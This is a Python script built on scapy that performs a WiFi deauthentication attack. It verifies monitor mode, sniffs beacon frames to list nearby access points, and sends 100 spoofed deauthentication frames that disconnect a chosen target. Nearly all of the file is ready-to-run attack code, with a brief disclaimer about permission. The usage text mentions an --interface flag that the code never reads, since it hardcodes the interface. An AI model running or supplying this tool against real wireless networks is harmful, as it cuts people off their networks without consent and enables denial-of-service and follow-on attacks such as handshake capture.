from scapy.all import *
import sys
import subprocess
import re

# wifi_deauth.py
#
# Description:
# ------------
# wifi_deauth.py is a Python script designed to perform a WiFi deauthentication attack
# using the `scapy` library. The script checks if the specified network interface is in
# monitor mode, scans the network for available devices, and allows the user to select
# a target device for the deauthentication attack. A deauthentication attack sends
# deauthentication frames to a target device to disconnect it from a WiFi network.
#
# Usage:
# ------
# The script can be executed directly from the command line. You must specify the network
# interface in monitor mode that will be used to scan for devices and send deauthentication
# packets.
#
# Example: Run the script and follow prompts to perform a deauthentication attack
#   python wifi_deauth.py --interface wlan0mon
#
# Before running the script, ensure that your network interface is in monitor mode.
#
# Dependencies:
# -------------
# - Python 3.x: Ensure Python is installed on your system.
# - scapy: A powerful Python library for packet manipulation. Install it via pip:
#     pip install scapy
# - Network Interface in Monitor Mode: A wireless network interface capable of monitor mode
#   is required to send deauthentication frames. Use a compatible WiFi adapter and set it to
#   monitor mode using tools like `airmon-ng` (part of the aircrack-ng suite).
#
# Configuration:
# --------------
# - Monitor Mode: Before running the script, set your wireless network interface to monitor
#   mode. This can typically be done using the following commands:
#     sudo airmon-ng start wlan0
#   This command will create an interface (e.g., wlan0mon) that can be used for packet injection.
#
# Notes:
# ------
# - Deauthentication attacks are disruptive and may violate network security policies and regulations.
#   Use this script only in controlled environments where you have explicit permission to conduct
#   penetration testing and security research.
# - The script requires root privileges to send deauthentication packets. Ensure you execute
#   the script with the necessary permissions (e.g., using sudo).
#
# Author: brkn404
# Date: 2024-08-28

def check_monitor_mode(interface):
    """
    Check if the specified network interface is in monitor mode.

    Args:
        interface (str): The network interface to check.

    Returns:
        bool: True if the interface is in monitor mode, False otherwise.
    """
    try:
        iwconfig_result = subprocess.run(['iwconfig', interface], capture_output=True, text=True).stdout
        if "Mode:Monitor" in iwconfig_result:
            print(f"[INFO] {interface} is in monitor mode.")
            return True
        else:
            print(f"[ERROR] {interface} is not in monitor mode. Please enable monitor mode and try again.")
            return False
    except Exception as e:
        print(f"[ERROR] Failed to check monitor mode: {e}")
        return False

def scan_network(interface):
    """
    Scan the network for nearby WiFi devices using the specified network interface.

    Args:
        interface (str): The network interface in monitor mode used for scanning.

    Returns:
        list: A list of tuples containing device MAC addresses and SSIDs.
    """
    print("[INFO] Scanning for WiFi devices. This may take a few seconds...")
    devices = set()
    def packet_handler(packet):
        if packet.haslayer(Dot11):
            if packet.type == 0 and packet.subtype == 8:  # Beacon frame
                mac_address = packet.addr2
                ssid = packet.info.decode(errors='ignore')
                devices.add((mac_address, ssid))
    
    sniff(iface=interface, prn=packet_handler, timeout=10)
    return list(devices)

def deauth(target_mac, ap_mac, interface):
    """
    Send deauthentication packets to a target device from a specified access point.

    This function constructs deauthentication frames using the `scapy` library and sends
    them to a target device to disconnect it from a WiFi network. It uses a network interface
    in monitor mode to send the packets.

    Args:
        target_mac (str): The MAC address of the target device to deauthenticate.
        ap_mac (str): The MAC address of the access point.
        interface (str): The network interface in monitor mode used to send the packets.
    """
    pkt = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    sendp(pkt, iface=interface, count=100, inter=0.1)
    print(f"[INFO] Sent deauthentication packets to {target_mac} from AP {ap_mac}")

# Example usage
if __name__ == "__main__":
    interface = "wlan0mon"  # Monitor mode interface

    if not check_monitor_mode(interface):
        sys.exit(1)

    devices = scan_network(interface)
    if not devices:
        print("[INFO] No WiFi devices found. Exiting.")
        sys.exit(1)

    print("[INFO] Available devices:")
    for idx, (mac, ssid) in enumerate(devices, start=1):
        print(f"{idx}. MAC: {mac}, SSID: {ssid}")

    choice = int(input("Select the device to deauthenticate (by number): "))
    if choice < 1 or choice > len(devices):
        print("[ERROR] Invalid choice. Exiting.")
        sys.exit(1)

    target_mac = devices[choice - 1][0]
    ap_mac = input("Enter the MAC address of the access point: ")

    deauth(target_mac, ap_mac, interface)

